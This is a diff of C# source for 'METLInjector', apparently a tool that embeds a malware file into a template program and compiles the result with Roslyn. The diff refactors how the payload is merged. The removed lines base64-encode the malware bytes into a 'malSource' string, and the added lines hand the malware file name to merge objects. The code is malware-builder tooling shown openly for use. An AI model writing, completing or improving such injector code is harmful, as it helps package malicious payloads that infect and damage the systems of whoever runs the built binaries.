@@ -1,10 +1,11 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Diagnostics.CodeAnalysis;
 using System.IO;
 using System.Linq;
 using System.Reflection;
+
 using METL.InjectorMerges.Base;
+
 using Microsoft.CodeAnalysis;
 using Microsoft.CodeAnalysis.CSharp;
 
@@ -12,11 +13,6 @@ namespace METL
 {
     public class METLInjector
     {
-        private static string GenerateCodeFromBytes(byte[] fileBytes)
-        {
-            return $"string malSource = \"{Convert.ToBase64String(fileBytes)}\";";
-        }
-
         private static byte[] CompileCodeToBytes(string sourceCode)
         {
             var options = CSharpParseOptions.Default.WithLanguageVersion(LanguageVersion.CSharp9);
@@ -70,7 +66,7 @@ namespace METL
 
             foreach (var merge in merges)
             {
-                sourceFile = sourceFile.Replace($"[{merge.FIELD_NAME}]", merge.Merge());
+                sourceFile = sourceFile.Replace($"[{merge.FIELD_NAME}]", merge.Merge(malwareEmbedString));
             }
 
             return sourceFile;
@@ -100,11 +96,7 @@ namespace METL
 
             var sourceCodeFileText = File.ReadAllText(sourceFileName);
 
-            var malwareBytes = File.ReadAllBytes(malwareFileName);
-
-            var malwareCodeFileText = GenerateCodeFromBytes(malwareBytes);
-
-            return CompileCodeToBytes(ParseAndMergeSource(sourceCodeFileText, malwareCodeFileText));
+            return CompileCodeToBytes(ParseAndMergeSource(sourceCodeFileText, malwareFileName));
         }
     }
 }
